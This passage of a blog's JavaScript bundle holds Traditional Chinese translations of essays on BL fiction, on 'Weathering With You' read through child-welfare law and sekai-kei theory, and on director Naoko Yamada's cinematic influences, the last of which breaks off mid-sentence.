歲以下的人看這些超色情的東西是好事，只是這種含有性層面要素的故事，我並不希望只是因為不適切或是令人不愉快的理由就因此將它們視為問題。</p>\n<p>關於二創的部份，我想在原作裡這份「穩確的信賴關係」或是描寫得很好的少年漫畫的部份對於腐女子自身來說是最重要的，所以才會有自覺自己的二創是在貶低原作，並且會造成男性和原作者的不愉快，而拚命的想把自己隱藏起來吧。</p>\n<p>其實 BL 哪，若真要說的話，比起登場人物是個「男的」，「不是女人」這件事我想或許會更加重要吧。如果有不是男生也不是女生的第三性那麼也許會更好。</p>\n<p>還有，與商業或二創無關，在 BL 物裡出現的「女角色」（若有原作的話就是女主角之類的等）經常會被描寫得很誇張。像是使用女人的武器卻被誇張的拒絕，或是毫不掩飾而和戀愛不扯上關聯，或是作為一個腐女子萌著男角色之類的設定在畫著。</p>\n<p>我在中午前上傳的關於 Togetter 的事情，有相當一部份能夠理解的人讓我吐了一口氣。在思春期的某段時間裡對於身為女性的性別感到厭惡，只是為了逃避的話那麼並不是只有 BL，</p>\n<p>像是「自稱僕」的女孩子，或是「捨女系」個性之類的，會在許多的地方上顯現出來。似乎比起把男性捨棄掉的男人，想把女性捨棄掉的女人更多呢。</p>\n<p>BL 對男同來說是相當失禮的這件事不知為何感覺有些遙遠，也許是因為「BL 是比起男的而言不是女的更加重要」吧。並不會對角色嚴謹的要求「身為男人」的體現。所以在 BL 裡會出現的男人「根本不存在嘛！」的有一大票，和「身為男性是很重要的」的男性同性愛的價值觀是有所不同的。</p>\n<p>雖然說是如此，即使只是設定上也是「男性之間的戀愛」來處理的，當然或許會傷到別人也不一定、我想應該要更加為這方面做些顧慮吧。</p>\n","date":"2019-10-29T06:00:00.000Z","excerpt":"","printDate":"October 29, 2019","printReadingTime":"1 min read"};

var route_44 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod29
});

var Mod30 = {"title":"【譯】若從兒童福利的觀點來看《天氣之子》，就會覺得更真實而有趣！","slug":"ACG-tenki-no-ko-from-child-welfare","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://hbol.jp/199661?display=b\">『天気の子』は、児童福祉の視点で見ると、さらにリアルで面白い！</a></p>\n<hr>\n<h2 id=\"正熱門的《天氣之子》。如果我們從兒童福利的角度來看\">正熱門的《天氣之子》。如果我們從兒童福利的角度來看…</h2>\n<p>根據興行通訊社的發表，《你的名字。》的導演新海誠的電影動畫《天氣之子》，在上映 25 天已經突破 584 萬觀眾，票房收入也突破了 78 億日圓。</p>\n<p>這篇文章想要從兒童福利的角度，介紹給還沒看過《天氣之子》，或是只看過一次的觀眾，在觀影上能夠更加有趣的要素。文章內仍然多少會含有一些劇情揭露，因此還沒看過的人也請注意。</p>\n<p>《天氣之子》的故事，從 16 歲的少年，帆高自島嶼離家出走到東京開始。他最先當成就寢地點的，是新宿的網路咖啡廳。</p>\n<p>帆高在櫃台前強調了兩次自己全身濕淋淋的樣貌，給予店員「連同到浴室的地板都要幫忙清潔的麻煩客人」的印象。</p>\n<p>或許這樣就能讓店員不去關心帆高是否是個離家出走的少年。</p>\n<h2 id=\"未滿-18-歲、沒有家人的許可，禁止工作、借宿\">未滿 18 歲、沒有家人的許可，禁止工作、借宿</h2>\n<p>新海導演在小說版《天氣之子》裡寫到「經過了 5 天」「過夜 1 晚兩千日圓」，但現實的漫畫喫茶店是，只要被發現為未滿 18 歲的客人，別說是連續住上數日，連待上 1 晚都沒辦法的地方。</p>\n<p>取景原型的網路咖啡廳「MANBOO!」的官方網站上，在「禁止入店與婉拒入店的情況」裡明白地記載了「晚上 6 點之後未滿 16 歲的客人，晚上 10 點以後未滿 18 歲的客人」。</p>\n<p>這是由東京都青少年健全培育條例所規定的。</p>\n<p>在這項條例之中，還有寫到『除了有取得監護者的委託，或是同意，以及有其它正當理由的情況之外，禁止在深夜（晚上 11 點至隔天清晨 4 點）攜出、陪伴或是留居青少年（未滿 18 歲之人）』。</p>\n<p>不只如此，在卡拉 OK、網路咖啡廳和電影院的部份還寫有「設施經營者與其代理人、管理人和其他從業人員，在深夜裡禁止讓青少年進入該設施內」。</p>\n<p>當然，孩童獨自在深夜裡徘徊也是不被許可的，規定亦有大人要讓小孩子歸宿的義務。</p>\n<p>也就是說，未滿 18 歲是沒有一般的居住設施可以使用的。所以帆高與相遇的少女陽菜，和她的弟弟凪 3 人即使想在飯店留宿，仍然接二連三地被拒絕，除了能夠付錢就了事的賓館以外沒有其它選擇。</p>\n<p>對大人來說理所當然能夠做到的行動，未滿 18 歲的人必須要先得到監護者的許可。</p>\n<p>對於這種大人單方面決定的社會規則，由於無知與不關心而無力的帆高，連一份打工都沒能找到。</p>\n<p>因為在勞動基準法的第 57 條裡，是這樣寫著的。</p>\n<p>「負責人對於未滿十八歲之人，必須於工作現場備有能證明其年齡之戶籍證明書。負責人對於僱用之兒童，必須於工作現場備有對其學業不會造成影響之學校校長的證明書，以及親屬或監護人的同意書」</p>\n<h2 id=\"在法律上不被允許判斷與選擇的孩子們的困境\">在法律上不被允許判斷與選擇的孩子們的困境</h2>\n<p>對於沒有戶籍證明書與親屬同意書的帆高，再怎麼用智慧型手機搜尋求才資訊，也不可能被僱用。</p>\n<p>如果在鄉下還有可能因為地方熟人能夠幫忙漁夫的工作當成打工，在都會裡這種依賴「法外」的作法是成不了有效的生存戰略。</p>\n<p>所以在麥當勞打工的陽菜，因為謊稱年齡「17 歲」而被炒魷魚也是當然的。恐怕陽菜也是一路走在這種謊報年齡被發現，在短期間內失去工作的走鋼索生活吧。（在現實的日本社會裡也有不少這樣子的少年少女）</p>\n<p>如果要在單親的媽媽過世後，守住與小學生弟弟兩人的生活，在同一個職場上一週最多只能工作 40 小時，並且不能執行夜間勤務，只能放棄學校生活。</p>\n<p>當然也能選擇透過兒童諮詢所到兒童保護設施裡生活，對於被逼迫到只剩下這個選項的，思春期的陽菜與凪這對姐弟來說，這就像是被迫向大人們承認「你們什麼都做不到」，而極為羞愧的一件事吧。</p>\n<p>另一方面，僱用沒有親屬的小孩子，也會背上違反勞基法的風險。</p>\n<h2 id=\"中年自由寫手，須賀所覺悟的「風險」\">中年自由寫手，須賀所覺悟的「風險」</h2>\n<p>帆高遇見的中年自由寫手須賀，即使知道帆高是離家出手的少年，仍讓他住在自己的事務所，讓他協助工作。雖然月薪只有 3000 日圓，包含三餐與免費住宿，以在十來歲就有離家經驗的須賀來說，已經是相當程度的用心。</p>\n<p>對於未經親屬許可就讓離家的未成年者留居，會有因誘拐罪被逮捕的風險，是須賀從一開始就已有所覺悟的事。（實際上，新聞也經常出現，因為讓未成年者留居家中而被警察逮捕的事件）</p>\n<p>然而這樣的須賀，擁有氣喘的女兒被岳母帶走，想要主張與女兒見面的權利，也因為有吸煙經歷而被嫌棄，如果再被冠上誘拐罪的罪名，在家庭裁判上的觀感會更差，或許會再也無法與女兒見面。</p>\n<p>所以在知道帆高被警察追捕後，才會說出「你回家去吧」。並且嘲笑這樣的自己。</p>\n<p>「人在年長之後啊，就不得不替換重要事物的順序啊」</p>\n<p>拋棄離家少年的將來而選擇與女兒平穩的生活的須賀，就和帆高與陽菜一樣，自覺自己也是受迫於社會的規則（法律）的不自由者，十分地苦悶。</p>\n<h2 id=\"開了-2-次槍的帆高，為什麼只是保護觀察處份就沒事了？\">開了 2 次槍的帆高，為什麼只是保護觀察處份就沒事了？</h2>\n<p>《天氣之子》裡真實的，不只是天空和城市的風景描寫。</p>\n<p>擁有只要賠命祈禱就能改變天氣的力量，能夠讓東京四周沉沒，改變世界的姿態，卻只有社會的規則改變不了。</p>\n<p>這種無力感的描寫極為真實，令人哀傷。</p>\n<p>而在這裡引發爭論的，就是帆高與陽菜重逢的鏡頭。</p>\n<p>兩人被拆開的這兩年半的時間，帆高回到老家，高中畢業。到了春天，再次上京。</p>\n<p>根據小說版所寫，他所犯下的罪名有，違反鎗刀法（禁止持有手槍）、刑法 95 條（妨礙公務）、殺人未遂罪、鐵路營業法 37 條（在鐵道上奔跑）。</p>\n<p>即使背上這麼多的罪名，在家庭裁判上被認定為「認為槍械並非為刻意持有，一連串下來的事件重大性低落，判斷不良性薄弱」在少年鑑別所待了 1 個月後，受到保護觀察處份，送回離島的老家。</p>\n<p>看到這裡想必會有認為「這實在是太都合主義了」，無法接受的人。</p>\n<p>開了 2 次槍，其中 1 次是將槍口對向警察的帆高的動機，即使警察想基於事實努力去理解，離家少年所說的「因為我想拯救晴女」也不可能被採納。</p>\n<p>或許，被送到少年刑務所或是少年醫療院的帆高，在數年後離開設施的門扉，在龐然大雨裡撐著傘無法看見臉龐的女性走來，畫面停在帆高落淚的表情後結束。這樣子的結局也是有可能的。</p>\n<p>然而，這樣就跟《幸福的黃手絹》一樣。</p>\n<p>這種收得恰恰好的結局，並不適合以大雨不斷落下，「異常氣候」的瘋狂世界為舞台的這個作品。</p>\n<p>並且，讓觀眾認為，18 歲的帆高，會在重返東京的未來裡，察覺到自己未被少年法所裁罰的罪惡的沉重，也能讓觀眾相信少年少女的成長，以及符合本作所祈願的主題「活下去」、「沒問題的」吧。</p>\n<p>而，因為須賀的哥哥是財務省的官僚，也許是這樣帆高的處份才會意外的輕…，這種「大人」的想像也挺有趣的。</p>\n<h2 id=\"讓孩子在名為生活與社會的現實裡成為大人\">讓孩子在名為生活與社會的現實裡成為大人</h2>\n<p>那麼，陽菜在這 2 年半裡是怎麼生活的？</p>\n<p>因為沒有親屬，沒有辦法打工，也沒辦法再繼續所創業的「晴女經濟」。</p>\n<p>15 歲是已經能成為公司社長的年齡。她是像現今的國高中生一樣在其他經濟產業裡創業了嗎？沒有智慧型手機也沒有中學生活的她，也無法知曉並受到同世代的人新作為的刺激吧。</p>\n<p>亦或是繼續謊稱年齡，在歌舞伎町的成人產業工作…？</p>\n<p>伏筆在於，須賀展現了即使要妨礙公務也要讓帆高踏上鳥居的「悔改」、讓帆高看凪與女兒一起玩的照片，以及小說版寫的「再次被允許能與弟弟一同生活」吧。</p>\n<p>這指的是，未被兒童諮詢所保護，能夠繼續過著 2 人孩童的生活。</p>\n<p>或許是須賀成為了沒有親屬的陽菜的未成年監護人。</p>\n<p>東京灣周邊沉沒後，帆高的公司興盛到能夠借了商業大廈的 1 間工作室，並僱用 2 位常勤工作人員，也是能夠協助負擔陽菜的生活費與學費。陽菜也能堂堂正正地打工並上高中。</p>\n<p>這麼一想，沒有智慧型手機的陽菜，在帆高唯一知道的線索，前往陽菜家路上的田端站前的坡道上，每天不斷地等待著的傷感之深，實在不免令人鼻酸。</p>\n<p>陽菜即使失去了「晴女」這個職務，仍然相信和帆高在一起就能獲得新的宿命，所以才能一直等下去吧。</p>\n<p>社會的架構並不是「只要賠命祈禱就能放晴」這麼簡單的東西，但只要能與共享勇氣的誰人一起，就能對如何解開這份謎題抱持著心動不已的憧憬活下去。</p>\n<p>裝有這麼多真實的設定，只能稱其為大傑作。在「我們是在全都知道這些事的情況下提供樂子的」的須賀的台詞裡，也能隱約看見新海導演的自信。</p>\n<p>失控的並不只是天氣和世界。</p>\n<p>大人們所創造出的社會規則，以保護孩子為由卻支配他們，逼迫孩子們必須走向「法外」。</p>\n<p>能夠改變這個失控的社會的，只有已經注意到這個社會已經失控的人吧。</p>\n<p>而只能祈禱的無力的孩子們，總有一天也會成為大人。</p>\n<p>服從失控的規則，依靠忍耐度過，實在太浪費人生與生命了。</p>\n<p>筆者我有種被帆高與陽菜這樣說道的感覺。</p>\n","date":"2019-09-19T07:32:22.000Z","excerpt":"","printDate":"September 19, 2019","printReadingTime":"1 min read"};

var route_17 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod30
});

var Mod31 = {"title":"【譯】《天氣之子》既是世界系的故事，也是這個世界的故事（給那已經不存在的「世界」）","slug":"ACG-tenki-no-ko-is-sekaikei-also-not","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://note.com/takahirobessho/n/n2b4a3f29a804\">https://note.com/takahirobessho/n/n2b4a3f29a804</a></p>\n<hr>\n<p>我總算是看完《天氣之子》了。原本是想到電影院去看的，但在《你的名字。》那種歷史性的爆紅之後，我覺得已經無法再一如往常地觀看「現象」化的新海誠作品，所以才等到了熱潮差不多散去後才看。過得倒是有些久了。</p>\n<p>看完之後最直接的感想是，新海誠導演真的厲害。以接續在《你的名字。》的潮流之後的作品來說，沒有比《天氣之子》更異質卻符合的作品了。它完全承續了《你的名字。》裡集大成的「世界系文脈」，卻也發揮「世界系的逆命題／映襯」的功能，將這兩種極端整合的背後，能看見新海誠身為作家充實的精力。以村上春樹來說的話，《天氣之子》就像是《發條鳥年代記》將初期的作家性連接至後期（這樣說聽來像是他已經結束了創作生涯，但這只是為了和初期做出區別所使用的詞語）的強力鉅作。</p>\n<p>我有個「個人原則」是，在看完作品後，基本上會先將自己的思考寫成文章後，才去參考外部的資訊，剛剛我稍微去搜尋了「天氣之子 世界系」。這是我平常不會做的事，但這部作品已經上映了一段時間，應該會有不少人有類似的想法吧。當然就出現了「《天氣之子》是世界系」的觀點。也有反方的「《天氣之子》不是世界系」的觀點。我想介紹其中 2 篇我覺得不錯的文章。首先是在世界系的文脈上仔細地解釋《天氣之子》的文章。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://note.com/ring31800/n/nf549dfd0c74f\">操縱世界的你和我，世界系的革命：《天氣之子》</a></li>\n</ul>\n<p>以及細微地補捉《天氣之子》不是世界系的觀點的文章。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://arcadia11.hatenablog.com/entry/2019/08/21/180000\">正因為《天氣之子》不是世界系，才能夠改變這個世界【電影感想/評論】</a></li>\n</ul>\n<p>這兩篇文章十分優秀而細膩的內容令我印像深刻。所以我想將讀完這兩篇文章之後，我所感受到的東西寫下來。在這之前有幾點請先注意。</p>\n<blockquote>\n<ol>\n<li>我目前只看了一次《天氣之子》，在台詞引用或細節上可能會有錯。</li>\n<li>會揭露到結局為止的劇情</li>\n<li>也會揭露一些《你的名字。》和《天空之城》的劇情</li>\n</ol>\n</blockquote>\n<p>那麼開始吧。</p>\n<blockquote>\n<p>▼ 目錄</p>\n<ol>\n<li>做為「世界系」的《天氣之子》</li>\n<li>透過感情曲線達到「感情渲染」的巧技</li>\n<li>我們生存的這個「世界」，已然是「世界系」</li>\n</ol>\n</blockquote>\n<h2 id=\"1-做為「世界系」的《天氣之子》\">1. 做為「世界系」的《天氣之子》</h2>\n<p>在這之前應該會有許多人疑惑「世界系」究竟是什麼，我先引用相當有名的東浩紀的定義。</p>\n<p>世界系所指的是「主角（我）和女主角（你）為中心的細小關係性問題，沒有夾帶任何具體的中間項，直接與「世界的危機」、「這個世界的盡頭」這一類的抽象大問題連結的作品」（引用自<a target=\"_blank\" rel=\"nofollow\" href=\"https://ja.wikipedia.org/wiki/%E3%82%BB%E3%82%AB%E3%82%A4%E7%B3%BB\">維基百科的「世界系」條目</a>）</p>\n<p>因為這種特質，世界系的故事會過度著眼於主角的心理內在、出現對世界系構造抱持意識的後設評論性視點，並因此創造出許多「零零年代的故事」獨有的各種特質，隨著零零年代結束後，「世界系」的討論也變少了。</p>\n<p>在這樣的情況下，《你的名字。》的超級爆紅後《天氣之子》同樣大獲佳績，可說十分驚人。新海誠導演的作品基本上多是屬於上述的「世界系的文脈」，亦即他的作品是與一般大眾的價值觀、道德觀和倫理觀有一定程度上的偏離的。他是位非常純潔而幼稚，並且極度刻意到露骨的程度的作家。也因為他是這種氣質的作家，他的作品裡也有著世界系作為特徵的「具體的中間項」，以及在維基內所講「社會領域」的空間的缺席，在《天氣之子》裡的「社會領域」也沒有在故事層面上發揮功能。</p>\n<p>為何帆高要離開島上，為何陽菜的雙親缺席，在這些能夠深掘的「故事」素材的部份都被裁剪掉。還有陽菜為何一開始會選擇成人產業，帆高能夠撿到鎗，並且擊發，這些帶有主題性的劇情，都只是為了做為符號消費而登場的，並不是為了拓展故事所準備。這種缺乏「社會領域」部份的描寫，正是「世界系」的特質。是種相當偏頗的說故事法。但卻爆炸性地獲得好評。可說這是這部作品裡最有意思的地方。</p>\n<h2 id=\"2-以感情曲線達成「感情渲染」的巧技\">2. 以感情曲線達成「感情渲染」的巧技</h2>\n<p>當然這是因為新海誠導演巧妙地編排故事所得到的成果。新海誠導演自己也曾說過，他的作品基本上是在極度細緻的「感情曲線」管理下所製作的。</p>\n<blockquote class=\"twitter-tweet\"><p lang=\"ja\" dir=\"ltr\">『天気の子』DVD/BD発売記念で、もう一つお蔵出しを。ネタバレ全開ご注意。プロット段階での物語構成表です。『天気の子』では脚本作業前に、このような表を作りながら物語の構成を練っていきました（完成した映画とは一部異なっています）。懐かしいなあ。 <a href=\"https://t.co/X4EA6SU3Ln\">pic.twitter.com/X4EA6SU3Ln</a></p>&mdash; 新海誠 (@shinkaimakoto) <a href=\"https://twitter.com/shinkaimakoto/status/1265554723358334978?ref_src=twsrc%5Etfw\">May 27, 2020</a></blockquote>\n\n<p>粗暴地說，<strong>新海誠導演的作品是「為了撼動觀眾的感情所製作的」</strong>。也就是透過美麗的動畫，與各種極為巧妙地配置的符號，強行地帶起我們的感情。</p>\n<p>例如這次的《天氣之子》，有個我認為非常精巧的場景是，警察到須賀所在的 K&amp;A 企畫工作室時，老警察問道「須賀先生，你沒事吧？」之後，鏡頭聚焦在須賀無意識流下的眼淚上，那真的是巧妙到可說是狡滑了。</p>\n<p>在那一幕之前，須賀正在看著房間裡的柱子上所刻著的，女兒的身高記錄。或許他的「無論如何都想再見一面的人」就是因為離婚而分居的女兒。因為他有這股強烈的感情，才會對於帆高即使要和警察或社會，亦或是「世界」為敵，也想「再一次去見」陽菜的心情有所同感吧，這一幕須賀的淚，對於像我們這種超過 40 歲的大叔來說，也是極度挑動淚腺。已經喪失的重要事物、人、回憶，這一切都由須賀的那行淚所喚醒。不必多加描寫，我們的記憶會隨著適當地配置好的符號（在這個場景裡則是刻有身高圖畫的柱子）的出現而共鳴。新海誠導演非常地擅長這方面的感情管理。所以不論如何，總是會為他所感動。</p>\n<h2 id=\"3-我們生存的這個「世界」，已然是「世界系」\">3. 我們生存的這個「世界」，已然是「世界系」</h2>\n<p>話說回來，即使有多麼卓越的感情管理，這仍然難以作為宛如從「繭居傾向的男性會有的幻想」精萃培養出的故事——《你的名字。》和《天氣之子》爆炸性人氣的理由。理應是小眾感性的「世界系的故事」，被這個「世界」所接納，並且是爆炸性的，我認為這有其它的理由。而那其實就是，<strong>我們活著的這個世界，已經開始成為「世界系」</strong>。現在的世界，已經成為不存在「社會領域」，在「我」的另一端就是「世界」的環境了。所以雖然「天氣之子」看起來像是「世界系」，實則描繪出了極度接近「我們現在這個世界的實感」的感觸。也就是 <strong>「《天氣之子》是世界系」的解讀方式和「《天氣之子》不是世界系」的解讀方式，我認為都是正確的</strong>。</p>\n<p>我們的世界正在「世界系化」，這可以有肯定和否定意義的解讀方式。否定的意義面上是，日本在 2000 年後因為小泉改革構造所導入的新自由主義，使得「一億總中流」消失了。雖然統計上日本的中間層級仍然相當地厚，<strong>問題是時代的轉變讓「中流消失」的這種意識出現在我們的日常談論裡</strong>。世界因為階級化、分裂、經濟階級加遽、各種身份的價值觀斷裂而加厚同溫層，2020 年的現在滿溢著這種「感覺」。不再有人認為自己是「中流」。每個人都抱著，若是失敗就會掉入深淵裡，從此無法振作，這樣的不安感活著。</p>\n<p>如此一來「社會領域」再難以形成以往「所有人共享的故事」的功能。過往是「文學」和「小說」誕生的地方，杜斯妥也夫斯基、托爾斯泰、狄更斯和福克納選為「故事」舞台的「社會領域」，在零零年代以後已經消失於眾人的眼前。我們必然地只能走向「世界系化」。「世界的世界系化」為了能夠驅動「故事」而進行著。而《你的名字。》和《天氣之子》將這種感觸全部化成了形體。</p>\n<p>而那幾乎會讓人誤會是照片的，極度真實的背景作畫，也是因為在這樣的故事才能大為活躍。新海誠導演的背景美術，和現實的整合度可說已經到了瘋狂的程度。我也曾經去過一次《你的名字。》的聖地，這是當時拍的新宿警察大廈的後側照片，當時因為那實在太接近電影裡畫面而大吃一驚。</p>\n<p>即使故事裡幾乎沒有描寫「社會領域」，《天氣之子》所刻畫出的社會樣貌是極為現實的。連住在滋賀的我也能認出「啊，這裡是澀谷」的寫實性。這所代表的是，正因為這是「寫實的世界」，才能如此不突兀地「成為世界系故事的背景」。</p>\n<p>而這緻密地描寫的「寫實的世界」不會成為「故事進行裡重要的地點」，僅會「做為背景處理」，這也和故事的三次元構造有相當密切的連結。「天氣之子」中地理的重要意義，是由帆高和陽菜與凪所建立的「我們的世界」，以及決定「世界的命運」的那片雲端上的「世界」，這兩者間的上下運動所構成的三次元空間決定。「我們的世界」是極低極為狹小，跟著電車的振動一同搖晃，若是有巨大地震就會隨之倒塌的公寓一隅。是像帆高途中在飯店（大概是愛情飯店？這也是個非常優秀的符號處理）度過一夜時所祈禱的「希望時間能永遠停住」的，最下層的微小世界。陽菜從這裡一瞬間消失到「最高的地方」，決定了這部電影最根本的「三次元空間的構成」。完全省略了中間的部份。也就是普通人所生活的「社會領域」與故事最重要的部份毫無關聯。真要說肯定有人因為那場大洪水而死，但這種「社會的痛楚」不會成為故事的對象。</p>\n<p>我認為這種感觸和世界系的先驅《天空之城》有些相似。在推特上我也有寫過類似的感想。</p>\n<blockquote class=\"twitter-tweet\"><p lang=\"ja\" dir=\"ltr\">天空の城ラピュタと比較しうる構造でもあるな。共に少女は世界を救うか滅ぼす力を持つ。ともに女の子からボーイのところに来る。男の子は「悪漢」から女の子を守る。最後ボーイはガールを助けに空に上る。ただ、ラピュタはバルスによって世界が救われるけど、天気の子ではセカイが選ばれ世界は壊れる。</p>&mdash; 別所隆弘 / Takahiro Bessho (@TakahiroBessho) <a href=\"https://twitter.com/TakahiroBessho/status/1268241292426788864?ref_src=twsrc%5Etfw\">June 3, 2020</a></blockquote>\n\n<p>當然《天空之城》並不是世界系。宮崎駿導演強烈的社會批判意識，所朝向的地方是「社會」的「世界」。他在前人所建立起的地方拚死地戰鬥著。但宮崎駿導演也有少年般的「即使與世界為敵也要拯救女孩子」這種純潔而幼稚的青澀感觸。這也直接表現在天空之城的巴魯身上。他與軍隊為敵、加入海賊，到監獄裡救出希達。講白了這是犯法行為。也就是有著相當濃厚的世界系特徵的「背離律法，拯救命運的女孩」的特質。使得《天空之城》看來像是「世界系的先驅」，在天空之城裡決定「整個世界」命運的「小世界」，是位於炸彈低壓中心的「龍之巢」天空之城拉普達。與之對應的「渺小的我們活著的世界」則是巴魯吹著喇叭的那個家。故事由這個家到《天空之城》的上下運動所驅動。從「天空上掉下來的女孩子」做為象徵開始，少年為了拯救女孩攀上天空，這是天空之城的地理移動。</p>\n<p>我得再說一次，宮崎駿導演並不是世界系作家，巴魯所生活的「社會領域」色彩相當濃厚。但天空之城的故事由極高與極低的場所之間的上下運動強烈地推進。處於中間的時間並不是故事的重要「舞台」。《天氣之子》在這點與天空之城相當類似，也是女孩子因為天降之光覺醒力量，最後男孩為了拯救「命運的女孩」攀上雲端。在上與下的連動裡，「中間部份」的「社會領域」沒有重量。<strong>然而中間領域卻有著極為真實的精細描寫。因為與故事幾乎毫無關聯，卻描繪得如此精美的這個地方，更會令我們回憶起每天的「毫無實感地活著的小世界」的感觸。想著我們現在是真的活著嗎</strong>。</p>\n<p>尤其在這遠端工作已經開始普及的武漢肺炎時代裡，「真實的不真實感」有更強的共鳴感。我們知道澀谷。我們知道新宿。也能從影像裡看出那裡有人活著。但不會去那裡、不能去那裡。因為現在應當避開人群聚集。</p>\n<p>變為如此的現在的世界，簡直就是「世界系」的世界了。未曾看過、去過，卻十分熟知的地方成為舞台，好事和壞事都透過 SNS 傳來的世界／世界系。將非現實的真人秀裡的舉止當成「真實」進行誹謗中傷的人，因此使得真正有血有肉的女孩死去的世界／世界系。看著未曾去過的都市裡白人警察殺害黑人的影像，Instagram 變成一整片黑的世界／世界系。我們不知何時開始，已經活在不需要「社會領域」的生活或共識就能推進事物的「世界系」裡了。這已經無關好壞，而是現實。</p>\n<p>所以《你的名字。》和《天氣之子》才會如此地廣為眾人所接受吧。我們已經失去了「世界」，活在「世界系」裡。</p>\n","date":"2020-06-19T19:37:58.000Z","excerpt":"","printDate":"June 19, 2020","printReadingTime":"1 min read"};

var route_15 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod31
});

var Mod32 = {"title":"【譯】RC 動畫評論 山田尚子的起源","slug":"ACG-the-influences-of-naoko-yamada","html":"<iframe width=\"560\" height=\"315\" title=\"the influences of naoko yamada\" src=\"https://www.youtube.com/embed/K_c1gQw6S6Q\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n\n<p>歡迎收看 RC 動畫。山田尚子的名號如今也已廣為人知。她是位在演出上擁有相當高評價的京都動畫監督，以粉色調的影像美和優異的音樂感性聞名，也有人認為她是現役監督裡最優秀的人。我同意，但我認為仍有許多人並不清楚她的創作文脈，每個作家都有所受到影響的源頭，山田尚子也不例外，有些根源對人們來說可能會覺得意外， 但其影響是可見的，就讓我們來看看成為其根源的這五位導演吧。</p>\n<p>首先是…</p>\n<h2 id=\"小津安二郎（yasujiro-ozu）--《靜寂》\">小津安二郎（YASUJIRO OZU） —— 《靜寂》</h2>\n<p>居酒屋的氣氛，寢室的調性，走廊上腳步聲的迴音，小津是有意識性地處理空間裡的聲音的，人們的生活是存在於什麼樣的聲音裡，盡可能減少會遮蓋住生活聲的音樂，給予觀眾一種樸實而直率的印象，就像是這並不是場戲，而是將生活直接呈現出來。</p>\n<p>山田尚子也繼承了這份寂靜，她是位擅長運用音樂、知曉如何活用環境音的監督，根據寂靜去表現角色的變化，讓號誌燈的聲音在場景的最後一刻響起，使用電車的發車聲，表現出面臨歧路的焦躁感。</p>\n<p>她是位能夠藉由刻畫生活的細部，去找出其中價值的監督。角色微妙的動作，在空間裡靜靜地流動的時間，是客觀性卻又樸實而直率的。根底上都是抒情，但這份抒情感則和另外一個源流有關。</p>\n<h2 id=\"sofia-coppola\">SOFIA COPPOLA</h2>\n<p>說到 SOFIA COPPOLA，就不得不提她優秀的現實感的描寫，她的影像讓人看來如同自己是旅行者，藉由類比底片的攝影與手持攝影機，創造出了帶有鄉愁感的畫面，就像是將日常生活裡的知名場景拍攝下來的家庭影片，各個細微的小事，對於身在其中的人都具有莫大的意義。</p>\n<p>其中所發生的事情的規模，和我們的日常生活並沒有太大的差別，例如聽著音樂望著風景的時刻，在 COPPOLA 的作品裡共通的自然態勢，天馬無邊的對話，許多無關緊要的對話，出演廣告的外國演員，地下鐵裡的乘客，或是角色獨自一人的風景。他們所珍惜的事物，注視著少女挫折的瞬間，這些創作手法也能在山田尚子的作品裡見到。</p>\n<p>某個角色醒了過來，無視他人呼聲的場景，某個角色將手伸向髮油，躲起來嘗試不同髮形的場景，受到 COPPOLA 的影響並不只有抒情，在視覺面上也有簡明易懂的影響，從方才的 2 部電影裡所看到類似膠捲的粗糙感也是例子之一，在特定的畫面裡會重現出相機鏡頭的特色，並且巧妙地將其融入動畫裡。</p>\n<h2 id=\"sergei-parajanov\">SERGEI PARAJANOV</h2>\n<p>山田監督談論到的作品裡，還有一部蘇聯的電影，由 PARAJANOV 所拍攝的《石榴的顏色》，其影響一看便知，《石榴的顏色》裡獨特的粉彩色，在山田尚子和京都動畫的作品裡相當常見，尤其在片尾裡的影響特別明顯，因為在片尾裡能夠再更冒險一點，非常平面的畫面構成，牆壁為背景，面向正面的人物，稍微後退的畫面，屬於讓背景闡述的演出類型，</p>\n<p>《石榴的顏色》也是一樣的，平面而如同繪畫般的畫面構成，雖然是部真人電影，看起來卻像是 2D，透過望遠鏡頭消去了畫面的深度，透過演員曖昧的動作加入了細微的差別，營造出一種不可思議的情緒，這也是山田尚子在自己的作品裡有作過的事情，超現實而不切實際的視覺面，但是山田尚子則在與現實主義之間採取了中庸的作法，在一開始只有在片尾裡會出現這樣的作風，直到越新的作品，畫面才開始變得更加實驗性，這種超現實和現實的平衡，是來自於對「感覺」極為優秀的控制所來。</p>\n<h2 id=\"楊德昌（edward-yang）-「感覺」\">楊德昌（EDWARD YANG）—— 「感覺」</h2>\n<p>拍攝了《恐怖份子》、《牯嶺街少年殺人事件》、《一一》的台灣導演楊德昌，擁有優秀的平衡感覺，在現實主義到超現實主義之間來回，而且所使用的並不是 CG 或是巨大的佈景，舞台仍然是普通的現實世界，透過將欲望影像化呈現出超現實，那個人所想看見的事物，所想達成的事情，看著會無法分辨什麼才是真的。這在「聲之形」裡也是相當明顯的特徵，石田的現實經常是模糊的，在家人談論不想聽聞的事情時，會刻意去遮斷那些內容，而他清楚地看見時，恐怖會顯現出來。</p>\n<p>也還有更曖昧的表現，在無意識下所感受到的悲傷，突然地顯現出來，非常喜歡的學姐們將要畢業，終將各奔東西的將來已經不遠。這可說是一瞬間所發生的事情，已經不曉得該做什麼，不曉得該去哪裡，一瞬間的光景，流逝的無常價值觀。山田尚子特別拿手的是察覺到的瞬間，這是來自山田尚子本人的體驗，對於自己內在的理解，在語言化的範圍之外的世界，所以才需要藉由表現去追求。</p>\n<h2 id=\"lucile-hadzihaliloic--「女性性」\">LUCILE HADZIHALILOIC —— 「女性性」</h2>\n<p>在山田監督的作品裡也很常出現不展露臉部的演出，而是讓身體的舉動去闡述故事，將鏡頭帶臉以外的部份，例如腳，使用腳來演出和解的瞬間，或是演出別離，偶爾會有拉得非常遠的畫面，即使知道那是誰，也無法去獲取當事人的感情 ，我認為這受到了 LUCILE HADZIHALILOIC 